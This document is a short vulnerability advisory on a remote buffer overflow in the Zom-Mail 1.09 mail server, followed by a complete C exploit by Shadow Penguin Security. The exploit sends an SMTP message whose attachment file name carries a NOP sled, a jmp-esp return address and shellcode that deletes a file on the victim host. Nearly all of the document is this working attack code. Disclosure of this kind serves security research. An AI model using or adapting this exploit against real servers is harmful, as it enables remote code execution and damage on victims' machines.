source: http://www.securityfocus.com/bid/761/info


In certain versions of the BTD Zom-Mail server there exists a buffer overflow which may be remotely exploitable by malicious users. The problem in question is in the handling of overly (past 256 chars) long file names for file attachments.


/*=============================================================================
   ZOM-MAIL 1.09 Exploit
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (shadowpenguin@backsection.net)
  =============================================================================
*/

#include    <stdio.h>
#include    <string.h>
#include    <windows.h> 
#include    <winsock.h>

#define     TARGET_FILE     "c:\\windows\\test.txt"
#define     MAXBUF          3000
#define     RETADR          768
#define     JMPESP_ADR      0xbffca4f7
#define     STACK_BYTES     32
#define     SMTP_PORT       25

#define     CONTENT \
"Subject: [Warning!!] This is exploit test mail.\r\n"\
"MIME-Version: 1.0\r\n"\
"Content-Type: multipart/mixed; "\
"boundary=\"U3VuLCAzMSBPY3QgMTk5OSAxODowODo1OCArMDkwMA==\"\r\n"\
"Content-Transfer-Encoding: 7bit\r\n"\
"--U3VuLCAzMSBPY3QgMTk5OSAxODowODo1OCArMDkwMA==\r\n"\
"Content-Type: image/gif; name=\"%s.gif\"\r\n"\
"Content-Disposition: attachment;\r\n"\
" filename=\"temp.gif\"\r\n"

unsigned char exploit_code[200]={
0xEB,0x32,0x5B,0x53,0x32,0xE4,0x83,0xC3,
0x0B,0x4B,0x88,0x23,0xB8,0x50,0x77,0xF7,
0xBF,0xFF,0xD0,0x43,0x53,0x50,0x32,0xE4,
0x83,0xC3,0x06,0x88,0x23,0xB8,0x28,0x6E,
0xF7,0xBF,0xFF,0xD0,0x8B,0xF0,0x43,0x53,
0x83,0xC3,0x0B,0x32,0xE4,0x88,0x23,0xFF,
0xD6,0x90,0xEB,0xFD,0xE8,0xC9,0xFF,0xFF,
0xFF,0x00
};
unsigned char cmdbuf[200]="msvcrt.dll.remove.";

void send_smtpcmd(SOCKET sock,char *cmd)
{
    char    reply[MAXBUF];
    int     r;
    send(sock,cmd,strlen(cmd),0);
    r=recv(sock,reply,MAXBUF,0);
    reply[r]=0;
    printf("%-11s: %s\n",strtok(cmd,":"),reply);
}
main(int argc,char *argv[])
{
    SOCKET               sock;
    SOCKADDR_IN          addr;
    WSADATA              wsa;
    WORD                 wVersionRequested;
    unsigned int         ip,p1,p2;
    char                 buf[MAXBUF],packetbuf[MAXBUF+1000];
    struct hostent       *hs;

    if (argc<3){
        printf("This exploit removes \"%s\" on the victim host",TARGET_FILE);
        printf("usage: %s SMTPserver Mailaddress\n",argv[0]);
        return -1;
    }
    wVersionRequested = MAKEWORD( 2, 0 );
    if (WSAStartup(wVersionRequested , &wsa)!=0){
        printf("Winsock Initialization failed.\n"); return -1;
    }
    if ((sock=socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET){
        printf("Can not create socket.\n"); return -1;
    }
    addr.sin_family     = AF_INET;
    addr.sin_port       = htons((u_short)SMTP_PORT);
    if ((addr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
            if ((hs=gethostbyname(argv[1]))==NULL){
                printf("Can not resolve specified host.\n"); return -1;
            }
            addr.sin_family = hs->h_addrtype;
            memcpy((void *)&addr.sin_addr.s_addr,hs->h_addr,hs->h_length);
    }
    if (connect(sock,(LPSOCKADDR)&addr,sizeof(addr))==SOCKET_ERROR){
        printf("Can not connect to specified host.\n"); return -1;
    }
    recv(sock,packetbuf,MAXBUF,0);
    printf("BANNER    : %s\n",packetbuf);

    send_smtpcmd(sock,"EHLO mail.attcker-host.net\r\n");
    send_smtpcmd(sock,"MAIL FROM: <attacker@attacker-host.net>\r\n");
    sprintf(packetbuf,"RCPT TO: <%s>\r\n",argv[2]);
    send_smtpcmd(sock,packetbuf);
    send_smtpcmd(sock,"DATA\r\n");
    
    memset(buf,0x90,MAXBUF); buf[MAXBUF]=0;
    ip=JMPESP_ADR;
    buf[RETADR  ]=ip&0xff;
    buf[RETADR+1]=(ip>>8)&0xff;
    buf[RETADR+2]=(ip>>16)&0xff;
    buf[RETADR+3]=(ip>>24)&0xff;

    strcat(exploit_code,cmdbuf);
    strcat(exploit_code,TARGET_FILE);
    p1=(unsigned int)LoadLibrary;
    p2=(unsigned int)GetProcAddress;
    exploit_code[0x0d]=p1&0xff;
    exploit_code[0x0e]=(p1>>8)&0xff;
    exploit_code[0x0f]=(p1>>16)&0xff;
    exploit_code[0x10]=(p1>>24)&0xff;
    exploit_code[0x1e]=p2&0xff;
    exploit_code[0x1f]=(p2>>8)&0xff;
    exploit_code[0x20]=(p2>>16)&0xff;
    exploit_code[0x21]=(p2>>24)&0xff;
    exploit_code[0x2a]=strlen(TARGET_FILE);
    memcpy(buf+RETADR+4+STACK_BYTES,exploit_code,strlen(exploit_code));

    sprintf(packetbuf,CONTENT,buf);
    send(sock,packetbuf,strlen(packetbuf),0);
    send_smtpcmd(sock,".\r\n");
    closesocket(sock);
    printf("Done.\n");
    return FALSE;
}
